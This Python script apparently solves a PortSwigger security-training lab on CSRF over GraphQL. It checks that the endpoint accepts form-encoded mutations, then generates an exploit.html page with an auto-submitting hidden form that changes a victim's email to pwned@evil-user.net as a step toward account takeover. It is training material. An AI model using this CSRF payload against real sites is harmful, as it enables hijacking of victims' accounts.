"""
Lab 5: Performing CSRF exploits over GraphQL
https://portswigger.net/web-security/graphql/lab-graphql-csrf
Difficulty: Practitioner

📝 The endpoint accepts the sensitive mutation via
application/x-www-form-urlencoded (not just JSON) — meaning a plain
auto-submitting HTML form works, no preflight, no custom headers needed.
Like Clickjacking, delivery is a page hosted on the exploit server that
runs in the VICTIM's browser (so it carries their session cookie).

Goal: change the victim's email address via a cross-site form submission.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
ENDPOINT_PATH = "/graphql/v1"


def confirm_form_encoded_accepted():
    note("Step 1: confirm the endpoint accepts form-encoded bodies, not")
    note("just JSON — this is what makes CSRF possible here.")
    s = get_session()
    mutation = 'mutation{changeEmail(input:{email:"test@test.com"}){email}}'
    r = s.post(f"{TARGET}{ENDPOINT_PATH}", data={"query": mutation})
    log(f"Form-encoded request status: {r.status_code}")
    print(r.text[:300])
    return r


def build_csrf_poc():
    mutation = 'mutation{changeEmail(input:{email:"pwned@evil-user.net"}){email}}'
    return f"""<form action="{TARGET}{ENDPOINT_PATH}" method="POST">
  <input type="hidden" name="query" value='{mutation}'>
</form>
<script>
  document.forms[0].submit();
</script>"""


def run():
    confirm_form_encoded_accepted()

    html = build_csrf_poc()
    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote CSRF PoC to {out_path}")

    note("Host on the exploit server and Deliver to victim — their email")
    note("gets changed to pwned@evil-user.net, which this lab treats as the")
    note("solve condition (a step toward account takeover via password reset).")


if __name__ == "__main__":
    run()
